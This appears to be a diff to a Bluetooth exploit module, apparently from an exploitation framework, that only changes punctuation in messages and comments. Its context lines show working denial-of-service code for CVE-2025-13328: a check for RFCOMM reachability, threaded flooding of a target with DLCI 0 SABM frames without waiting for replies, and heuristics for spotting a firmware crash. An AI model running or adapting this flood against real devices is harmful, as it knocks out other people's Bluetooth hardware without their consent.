@@ -124,7 +124,7 @@ class Module(ExploitModule):
 
     def check(self) -> bool:
         if not BLUETOOTH_AVAILABLE:
-            print_error("pybluez2 required — pip install pybluez2")
+            print_error("pybluez2 required, pip install pybluez2")
             return False
         target = self.get_option("target")
         if not self.validate_bd_addr(target):
@@ -139,7 +139,7 @@ class Module(ExploitModule):
             s.settimeout(5.0)
             s.connect((target, RFCOMM_PSM))
             s.close()
-            print_success("RFCOMM PSM reachable — target may be vulnerable to CVE-2025-13328")
+            print_success("RFCOMM PSM reachable, target may be vulnerable to CVE-2025-13328")
             return True
         except bluetooth.BluetoothError as e:
             print_error(f"Unreachable: {e}")
@@ -147,7 +147,7 @@ class Module(ExploitModule):
 
     def run(self) -> bool:
         if not BLUETOOTH_AVAILABLE:
-            print_error("pybluez2 required — pip install pybluez2")
+            print_error("pybluez2 required, pip install pybluez2")
             return False
         if os.geteuid() != 0:
             print_error("Root privileges required")
@@ -184,7 +184,7 @@ class Module(ExploitModule):
                     sock.settimeout(3.0)
                     sock.connect((target, RFCOMM_PSM))
 
-                    # Rapid DLCI 0 SABM flood — no waiting for UA
+                    # Rapid DLCI 0 SABM flood, no waiting for UA
                     flood_frames = 0
                     while not stop.is_set() and flood_frames < flood_rate:
                         sock.send(self._sabm(0))
@@ -214,7 +214,7 @@ class Module(ExploitModule):
                     with lock:
                         stats["errors"] += 1
                     if "refused" in str(e).lower() or "not connected" in str(e).lower():
-                        # Crash likely — target not responding
+                        # Crash likely, target not responding
                         pass
 
         threads = [
@@ -251,10 +251,10 @@ class Module(ExploitModule):
         if stats["frames"] > 0:
             print_success(f"CVE-2025-13328: Sent {stats['frames']} RFCOMM SABM frames to {target}")
             if stats["errors"] > 5:
-                print_success(f"High error rate ({stats['errors']}) — firmware may have crashed")
+                print_success(f"High error rate ({stats['errors']}), firmware may have crashed")
                 print_success("Check if target Bluetooth is still discoverable")
             else:
-                print_info("Low error rate — target may be patched or frame rate too low")
+                print_info("Low error rate, target may be patched or frame rate too low")
             self.add_result({
                 "target": target,
                 "frames_sent": stats["frames"],
@@ -264,7 +264,7 @@ class Module(ExploitModule):
             })
             return True
 
-        print_error("No frames sent — target unreachable")
+        print_error("No frames sent, target unreachable")
         return False
 
     def _sabm(self, dlci: int) -> bytes:
